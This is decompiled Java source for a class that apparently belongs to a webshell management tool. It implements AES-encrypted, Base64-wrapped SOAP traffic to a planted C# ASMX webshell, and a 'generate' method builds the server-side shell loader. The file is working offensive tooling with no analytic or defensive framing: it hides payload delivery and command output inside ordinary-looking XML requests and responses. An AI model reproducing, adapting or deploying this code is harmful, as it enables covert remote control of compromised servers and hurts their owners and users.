/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.cshapAes;

import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.InputStream;
import java.net.URLEncoder;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import shells.cryptions.cshapAes.Generate;
import util.Log;
import util.functions;
import util.http.Http;

public class CShapAsmxAesBase64Ex
implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String findStrLeft;
    private String pass;
    private String findStrRight;
    private String xmlRequest;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + this.key);
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
        this.findStrRight = findStrMd5.substring(16).toUpperCase();
        this.shell.getHeaders().put("Content-Type", "text/xml; charset=utf-8");
        this.xmlRequest = CShapAsmxAesBase64Ex.readXmlRequest(this.pass);
        try {
            this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.encodeCipher.init(1, (Key)new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.decodeCipher.init(2, (Key)new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
            return;
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            return this.xmlRequest.replace("{payload}", URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(this.payload)))).replace("{data}", URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    @Override
    public boolean isSendRLData() {
        return false;
    }

    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoderByAsmx("csharpShellEx", password, functions.md5(secretKey).substring(0, 16));
    }

    private static String readXmlRequest(String pass) {
        byte[] data = new byte[]{};
        try {
            InputStream inputStream = CShapAsmxAesBase64Ex.class.getResourceAsStream("template/asmxRequestEx.bin");
            data = functions.readInputStream(inputStream);
        } catch (Exception e) {
            Log.error(e);
        }
        return new String(data).replace("{pass}", pass);
    }
}

